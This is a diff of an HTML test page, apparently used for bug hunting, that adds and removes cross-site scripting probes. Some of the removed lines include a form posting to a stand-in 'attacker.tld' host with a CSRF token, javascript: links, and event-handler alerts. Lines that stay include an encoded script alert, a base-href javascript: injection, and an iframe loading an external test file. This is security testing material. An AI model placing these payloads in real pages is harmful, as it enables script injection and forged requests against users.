@@ -35,19 +35,10 @@ include 'log.php';
     
    <iframe src="https://bughunt1307.herokuapp.com/xss2.eml">
 
-<div><form action="http://attacker.tld"></div>
-
-<form method="POST" id="subscribe" action="/api/v1/newsletter/subscribe">
-
-<input type="hidden" name="csrftoken" value="5f4dcc3b5aa765d61d8327deb882cf99" />
-
-<input type="submit" value="Subscribe to newsletter" />
-
-              </form></div>
 
       
     <p>&#x22;&#x3E;&#x3C;img src=x&#x3E;&#x3C;script&#x3E;alert(0)&#x3C;/script&#x3E;</p>
-    <base href=x><a href=javascript:alert(0)><base href=x>xss</a>
+   
 
   <amp-iframe width="300"
   title="Netflix House of Cards branding: The Stack"
@@ -57,13 +48,11 @@ include 'log.php';
   allowfullscreen
   frameborder="0"
   src="https://mail.google.com/mail/u/2/">
-     <amp-img layout="fill" src="https://foo.com/foo.png" onmouseover="alert(1)" placeholder></amp-img>
+     <amp-img layout="fill" src="https://foo.com/foo.png"  placeholder></amp-img>
 </amp-iframe>
 
-<textarea onmousover="alert(1)">xxxe.com/"><base href="javascript:\"><a href="/xss//alert(document.domain)"></textarea>
+<textarea>xxxe.com/"><base href="javascript:\"><a href="/xss//alert(document.domain)"></textarea>
 
-<embed src=x.swf>
-  <object data=x.swf>
-    <iframe src=javascript:alert(0)>
+
   </body>
 </html>
